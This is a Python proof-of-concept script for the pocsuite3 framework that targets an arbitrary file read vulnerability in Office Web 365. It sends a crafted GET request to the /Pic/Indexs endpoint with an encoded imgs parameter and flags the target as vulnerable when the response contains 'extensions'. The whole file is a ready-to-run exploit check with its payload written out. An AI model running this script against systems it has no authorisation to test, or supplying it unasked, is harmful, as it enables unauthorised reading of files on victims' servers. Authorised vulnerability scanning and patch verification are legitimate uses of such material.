# _*_ coding:utf-8 _*_
# @Time : 2024/1/2 20:00
# @Author: 为赋新词强说愁
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class OfficeWeb365_Pic(POCBase):
    pocDesc = '''Office Web 365 任意文件读取漏洞'''
    vulID = '1'
    version = '1.0'
    author = '公众号网络安全透视镜'
    vulDate = '2024-01-02'
    createDate = '2024-01-02'
    updateDate = '2024-01-02'
    name = 'Office Web 365 任意文件读取漏洞'
    appName = 'Office Web 365'

    def _verify(self):

        result = {}
        path = """/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09"""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Sec-Fetch-Mode": "no-cors",
            "Sec-Ch-Ua": '"Chromium";v="103", ".Not/A)Brand";v="99"',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Sec-Fetch-Dest": "script",
            "Sec-Ch-Ua-Platform": "\"Windows\"",
            "Sec-Fetch-Mode": "no-cors",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        url = self.url + path
        payload = """
        GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        DNT: 1
        Connection: close
        Upgrade-Insecure-Requests: 1
        """
        try:
            response = requests.get(url, headers=headers, verify=False)
            # 验证成功输出相关信息
            if response.status_code == 200 and 'extensions' in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['payload'] = payload

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(OfficeWeb365_Pic)